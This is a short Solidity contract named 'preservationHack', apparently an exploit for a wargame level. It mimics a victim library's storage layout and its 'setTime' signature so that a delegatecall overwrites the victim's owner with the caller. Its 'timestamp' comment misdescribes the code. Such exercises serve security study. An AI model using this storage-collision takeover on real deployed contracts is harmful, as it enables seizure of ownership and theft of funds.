// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract preservationHack {

    // stores a timestamp
    address public dummy1;
    address public dummy2;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}